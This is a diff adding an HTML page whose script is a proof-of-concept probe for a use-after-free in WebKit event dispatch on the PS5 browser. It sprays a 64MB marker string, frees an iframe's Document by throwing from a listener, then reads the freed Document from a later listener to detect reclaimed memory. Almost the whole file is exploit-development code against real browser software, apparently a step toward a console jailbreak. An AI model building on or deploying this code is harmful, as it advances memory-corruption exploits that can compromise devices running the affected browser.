@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PS5 v_EventTarget — Third Listener Test</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
+font-family:'MS Gothic','Courier New',monospace}
+#out{position:fixed;top:0;left:0;right:0;bottom:0;
+padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55}
+.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff}
+</style>
+</head>
+<body>
+<div id="out"></div>
+<button id="btn" style="position:fixed;top:10px;right:10px;z-index:999;
+padding:10px 20px;background:#333;color:#0f0;border:1px solid #0f0;
+cursor:pointer;font-family:monospace">▶ TRIGGER</button>
+<script>
+"use strict";
+
+var O = document.getElementById("out");
+var btn = document.getElementById("btn");
+
+function P(m, c) {
+    var s = document.createElement("span");
+    if (c) s.className = c;
+    s.textContent = m + "\n";
+    O.appendChild(s);
+    O.scrollTop = O.scrollHeight;
+}
+function Ok(m) { P("  ✅ " + m, "ok"); }
+function Fl(m) { P("  ✘ " + m, "er"); }
+function Hi(m) { P("  ► " + m, "hl"); }
+function Dm(m) { P("  " + m, ""); }
+
+// Build the spray string: 64MB of 'A's
+// We'll add marker bytes at known offsets for detection
+function buildSpray() {
+    var spray = '';
+    // First 8 bytes: marker 'PWN3D!!' in hex (0x50574e3344212100)
+    // When read as a vtable, this will crash, but if someone reads
+    // a string property, they'll see our marker
+    spray += 'PWN3D!!';
+    // Bytes 8-15: pointer-like pattern (simulating a real vtable entry)
+    spray += '\x00\x01\x00\x00\x00\x00\x00\x00';
+    // Fill rest with 'A'
+    while (spray.length < 64 * 1024 * 1024) {
+        spray += 'A'.repeat(Math.min(65536, 64 * 1024 * 1024 - spray.length));
+    }
+    return spray;
+}
+
+var testCount = 0;
+var maxTests = 5;
+
+function runTest() {
+    testCount++;
+    P("========================================", "hl");
+    P("TEST #" + testCount + " of " + maxTests, "hl");
+    P("========================================\n", "hl");
+    
+    if (testCount > maxTests) {
+        P("\nAll tests complete.", "ok");
+        btn.textContent = "✓ DONE";
+        btn.disabled = true;
+        return;
+    }
+    
+    var spray = buildSpray();
+    var f = null;
+    var a = null;
+    var b = null;
+    var thirdListenerFired = false;
+    var uafResult = null;
+    
+    try {
+        f = document.body.appendChild(document.createElement('iframe'));
+        a = document.createElement('div');
+        b = a.appendChild(document.createElement('div'));
+        
+        // Listener 1: Frees the Document (same as original PoC)
+        a.addEventListener('a', eval('(function() {\
+            document.adoptNode(a);\
+            f.remove();\
+            Dm("  [Listener 1] Document freed via throw...");\
+            throw {\
+                line: 1, column: 1,\
+                sourceURL: spray\
+            };\
+        })'));
+        
+        // Listener 2: Buffer listener (does nothing)
+        a.addEventListener('a', function() {
+            Dm("  [Listener 2] Buffer listener fired");
+        });
+        
+        // Listener 3: THE KEY — executes AFTER the throw
+        // WebKit catches the exception and continues dispatch
+        a.addEventListener('a', function() {
+            thirdListenerFired = true;
+            Dm("  [Listener 3] FIRED! (After the throw)");
+            
+            // Try to access the freed Document
+            // IMPORTANT: We use f.contentDocument, NOT savedDoc
+            // This way we don't hold a reference that prevents GC
+            try {
+                var doc = f.contentDocument;
+                
+                if (doc === null) {
+                    Dm("  f.contentDocument is null (expected)");
+                    uafResult = { status: "null" };
+                } else {
+                    Dm("  f.contentDocument is NOT null!");
+                    Dm("  nodeType: " + doc.nodeType);
+                    Dm("  URL: " + doc.URL);
+                    Dm("  title: " + doc.title);
+                    
+                    // Try to read various properties
+                    var props = {
+                        nodeType: doc.nodeType,
+                        URL: doc.URL,
+                        title: doc.title,
+                        dir: doc.dir,
+                        compatMode: doc.compatMode,
+                        characterSet: doc.characterSet,
+                        contentType: doc.contentType,
+                        referrer: doc.referrer
+                    };
+                    
+                    // Check if any property contains our spray marker
+                    for (var key in props) {
+                        var val = String(props[key]);
+                        if (val.indexOf('PWN3D') !== -1) {
+                            Fl("  ✘ PROPERTY LEAK! " + key + " contains spray marker");
+                            Fl("  Value starts with: " + val.substring(0, 20));
+                        }
+                    }
+                    
+                    uafResult = { status: "reclaimed", props: props };
+                }
+            } catch (e) {
+                Dm("  EXCEPTION in third listener: " + e.message);
+                uafResult = { status: "error", error: e.message };
+            }
+        });
+        
+        // The bubble listener (same as original)
+        b.addEventListener('a', function() {
+            Dm("  [Bubble Listener] dispatching...");
+            f.contentDocument.adoptNode(a);
+        });
+        
+        // Dispatch the event
+        Dm("\nDispatching event...");
+        b.dispatchEvent(new Event('a', { bubbles: true }));
+        
+        // Check results after dispatch
+        setTimeout(function() {
+            P("", "");
+            Hi("===== RESULTS =====");
+            
+            if (thirdListenerFired) {
+                Ok("Third listener executed!");
+                
+                if (uafResult) {
+                    Dm("UAF Result: " + JSON.stringify(uafResult));
+                    
+                    if (uafResult.status === "reclaimed") {
+                        Ok("The freed Document memory was accessable!");
+                        Dm("Properties read during UAF:");
+                        for (var k in uafResult.props) {
+                            Dm("  " + k + " = " + String(uafResult.props[k]).substring(0, 40));
+                        }
+                        
+                        // Check for markers
+                        if (testCount === 1) {
+                            // First run: no marker in spray (just 'A's)
+                            // Second run: add marker at different offsets
+                        }
+                    } else if (uafResult.null) {
+                        Dm("Document was null (GC freed it properly)");
+                    } else if (uafResult.error) {
+                        Fl("Error during UAF access: " + uafResult.error);
+                    }
+                } else {
+                    Fl("No UAF result collected");
+                }
+            } else {
+                Fl("Third listener did NOT fire!");
+                Dm("This means WebKit STOPS dispatch after a throw");
+                Dm("This approach will NOT work with standard event dispatch");
+            }
+            
+            P("", "");
+            setTimeout(runTest, 1000);
+        }, 500);
+        
+    } catch (e) {
+        Fl("Top-level exception: " + e.message);
+        setTimeout(runTest, 1000);
+    }
+}
+
+btn.addEventListener('click', function() {
+    btn.textContent = "▶ RUNNING...";
+    btn.disabled = true;
+    P("\n\n", "");
+    P("♠ PS5 EventTarget UAF — Third Listener Test ♠", "hl");
+    P("=============================================", "hl");
+    P("Testing if WebKit continues dispatch after throw", "");
+    Dm("If third listener fires, we can access freed Document");
+    Dm("via f.contentDocument (no savedDoc reference)");
+    P("", "");
+    testCount = 0;
+    runTest();
+});
+
+// Auto-report on load
+Dm("Page loaded. Click the button to start test.");
+Dm("Make sure you're on PS5 FW 13.40 browser.");
+Dm("Each test creates a 64MB spray string.");
+Dm("Running " + maxTests + " iterations with GC in between.");
+</script>
+</body>
+</html>
